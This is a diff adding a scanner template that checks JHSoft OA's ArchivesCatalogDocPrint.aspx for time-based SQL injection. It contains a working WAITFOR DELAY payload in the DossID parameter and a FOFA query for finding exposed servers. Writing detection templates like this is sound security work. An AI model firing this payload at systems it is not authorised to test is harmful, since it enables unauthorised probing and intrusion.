@@ -1,0 +1,55 @@
+id: poc-yaml-jinher-archivescatalogdocprint-aspx-sqli
+info:
+  name: JHSoft ArchivesCatalogDocPrint.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: JHSoft OA
+    fofa: app="金和网络-金和OA"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + to_number(t1)}}"
+  t3: "{{to_number(t2) + 2}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-jhsoft
+    method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "JHSoft"
+        part: body
+
+  - id: sqli-test
+    method: GET
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.Archives/ArchivesCatalogDocPrint.aspx/?DossID=1'waitfor+delay'0:0:{{t1}}'--"
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - "SessionId=([a-zA-Z0-9]+)"
+        internal: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "SessionId="
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t2) && duration <= to_number(t3)"
